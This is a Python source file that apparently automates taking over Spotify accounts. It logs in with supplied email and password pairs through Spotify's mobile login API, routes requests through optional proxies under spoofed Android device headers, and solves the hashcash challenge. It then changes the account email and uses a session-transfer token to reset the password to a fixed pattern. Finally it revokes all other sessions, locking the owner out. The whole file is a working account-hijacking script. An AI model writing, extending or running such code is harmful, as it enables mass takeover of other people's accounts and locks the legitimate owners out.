import random
import requests
from requests.adapters import HTTPAdapter
import binascii
from helper import log
import os
from helper import solver , get_traceback
from spotify.login5.v3.client_info_pb2 import ClientInfo
import spotify.login5.v3.login5_pb2 as login0
from google.protobuf.json_format import MessageToJson
from spotify.login5.v3.credentials.credentials_pb2 import Password
from spotify.login5.v3.challenges.hashcash_pb2 import HashcashSolution
from google.protobuf import duration_pb2
from protobuf_to_dict import protobuf_to_dict
def random_hex_string(length: int):
    get_random_bytes = os.urandom
    buffer = get_random_bytes(int(length / 2))
    return binascii.hexlify(buffer).decode()

class Spotify:

    def __init__(self,threadnum,email,password,proxy=None):
        self.client_secret = None
        self.email = email.strip()
        self.threadnum = threadnum
        self.password = password.strip()
        self._client_id = "9a8d2f0ce77a4e248bb71fefcb557637"
        self._app = "Spotify"
        self._version = "8.7.54.403"
        self._androidMdodel = "MI 2A"
        self.androidmanufacturer = "Google"
        self._androidVersion = random.randint(19, 29)
        self._device_id = random_hex_string(16)
        self.client_token = ""
        self.s = requests.Session()
        self.s.mount('http://', HTTPAdapter(max_retries=5))
        self.s.mount('https://', HTTPAdapter(max_retries=5))
        self.authToken = None
        if proxy:
            self.s.proxies.update({
                "http": f"http://{proxy}",
                "https": f"http://{proxy}" 
            })
            print("Using proxy: ", proxy)


    def login(self):
        try:
            print("Logging in with: ", self.email, self.password)
            self.s.headers.update({
                "Cache-Control": "no-cache, no-store, max-age=0",
                "User-Agent": f"{self._app}/{self._version} Android/{self._androidVersion} ({self._androidMdodel})",
                "Content-Type": "application/x-protobuf",
                'Accept-Encoding': 'gzip, deflate'
            })
            print("Sending login request")
            protoreq = login0.LoginRequest(client_info=ClientInfo(client_id=self._client_id, device_id=self._device_id),
                                        password=Password(id=self.email, password=self.password,
                                                            padding=binascii.unhexlify(
                                                                b'151515151515151515151515151515151515151515')))
                                                 
            try:
                print("Sending login request 2")
                resp = self.s.post("https://login5.spotify.com/v3/login",
                                protoreq.SerializeToString(), )
                print("Got login response")
            except requests.exceptions.ProxyError:
                log(self.threadnum, "Proxy error")
                print("Proxy error")
                return "proxyerror"
            except requests.exceptions.ConnectionError:
                log(self.threadnum, "Connection error")
                print("Connection error")
                return "connectionerror"
            except Exception as e:
                log(self.threadnum, get_traceback(e))
                print("Error: ", get_traceback(e))
                return False
            
            
            if resp.content == b'\x10\x01':
                print("Wrong password")
                return False

            print("Got login response")
            proto_res = login0.LoginResponse()
            proto_res.ParseFromString(resp.content)
            print(proto_res)
            ch = proto_res.challenges
            hashcash = ch.challenges[0].hashcash.prefix
            con = proto_res.login_context
            sufx, rep = solver(con, hashcash)
            print("Solved captcha")
            if not sufx:
                return False
            dur = duration_pb2.Duration(nanos=1000000000, seconds=1)
            challengesolution = HashcashSolution(suffix=sufx, duration=dur)
            challengesolutions = login0.ChallengeSolution(hashcash=challengesolution)
            protoreqq = login0.LoginRequest(client_info=ClientInfo(client_id=self._client_id, device_id=self._device_id),
                                            password=Password(id=self.email, password=self.password,
                                                            padding=binascii.unhexlify(
                                                                b'151515151515151515151515151515151515151515')),
                                            login_context=con,
                                            challenge_solutions=login0.ChallengeSolutions(solutions=[challengesolutions]))
            print("Sending login request with captcha")
            respp = self.s.post("https://login5.spotify.com/v3/login",
                                protoreqq.SerializeToString())
            if respp.content == b'\x10\x01':
                print("Wrong password")
                return False                    
            if respp.status_code == 200: 
                proto_ress = login0.LoginResponse()
                proto_ress.ParseFromString(respp.content)
                log(self.threadnum, f"Login response: {protobuf_to_dict(proto_ress)}")
                self.authToken = (protobuf_to_dict(proto_ress)['ok']['access_token'])
                self.refreshToken = (protobuf_to_dict(proto_ress)['ok']['stored_credential'])
                print("Logged in")
                return True
            
            return False
        except Exception as e:
            with open('error.txt', 'a') as f:
                f.write("error in login: " + str(get_traceback(e)) + "\n")
                print("Error: ", get_traceback(e))
            return False
            

    def changeEmail(self, newEmail):
        """make put call at https://spclient.wg.spotify.com/accountsettings/v1/profile/email with new email as payload"""
        self.s.headers.update({
            "Accept-Language": "en-US",
            "User-Agent": f"{self._app}/{self._version} Android/{self._androidVersion} ({self._androidMdodel})",
            "Content-Type": "application/json; charset=UTF-8",
            'Accept-Encoding': 'gzip, deflate',
            'Spotify-App-Version': self._version,
            'X-Client-Id': self._client_id,
            'App-Platform': 'Android',
            'Authorization': f'Bearer {self.authToken}'
        })
        for i in range(3):
            try:

                resp = self.s.put("https://spclient.wg.spotify.com/accountsettings/v1/profile/email", json={"email": newEmail, "password": self.password})
                if resp.status_code == 200:
                    "decode json response and check if email was changed"
                    json_resp = resp.json()
                    if json_resp["email"] == newEmail:
                        return True
                else:
                    with open("error.txt", "a") as f:
                        f.write('returned status code: ' + str(resp.status_code) + 'from change email\n')
            except Exception as e:
                with open('error.txt', 'a') as f:
                    f.write("error in change email: " + str(e) + "\n")
        return False


    def jumpAndChange(self):
        self.s.headers.clear()
        pos = '{"url":"https://accounts.spotify.com/en/status"}'
        headerstk = {"Accept-Language": "en",
                     "Authorization": f"Bearer {self.authToken}",
                     "Content-Type": "application/json",
                     "User-Agent": "Spotify/116500643 Win32/Windows 10 (10.0.19043; x64)",
                     "Origin": "https://spclient.wg.spotify.com",
                     "Sec-Fetch-Site": "same-origin",
                     "Sec-Fetch-Mode": "no-cors",
                     "Sec-Fetch-Dest": "empty",
                     "Accept-Encoding": "gzip, deflate",
                     "Content-Length": '112'}
        self.s.headers.update(headerstk)
        for i in range(3):
            try:
                resp = self.s.post("https://spclient.wg.spotify.com/sessiontransfer/v1/token", data=pos)
                if resp.status_code == 200:
                    self.passwordToken = resp.json()["token"]        
                    if self.Reset_Password():
                        self.s.get("https://accounts.spotify.com/revoke_sessions/?continue=https%3A%2F%2Faccounts.spotify.com")
                        return True
                    else:
                        with open('error.txt', 'a') as f:
                            f.write("error returend code is not 200 from reset password")
                        return False
                else:
                    with open('error.txt', 'a') as f:
                        f.write("error returend code is not 200 from jumpandchange")
            except Exception as e:
                with open('error.txt', 'a') as f:
                    f.write("error in jump and change: " + str(e) + "\n")
        return False
                


    def Reset_Password(self):
        _appHeader = {
            # "Client-Token": self.getClientToken(),
            "accept-language": "en-US",
            "User-Agent": f"{self._app}/{self._version} Android/{self._androidVersion} ({self._androidMdodel})",
            "Spotify-App-Version": self._version,
            "X-Client-Id": self._client_id,
            "App-Platform": "Android",
            "Authorization": f"Bearer {self.authToken}",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
        }
        data = {
            "password": f"{self.email}cc",
            "oneTimeToken": self.passwordToken,
        }
        try:
            resp = requests.put("https://spclient.wg.spotify.com/accountrecovery/v2/password/",
                            json=data,
                            headers=_appHeader)
        
            if resp.status_code == 200:
                return True
            else:
                with open('error.txt', 'a') as f:
                    f.write("error returend code is not 200 from reset password")
                return False
        except Exception as e:
            with open('error.txt', 'a') as f:
                f.write("error in reset password: " + str(e) + "\n")
        return False
        
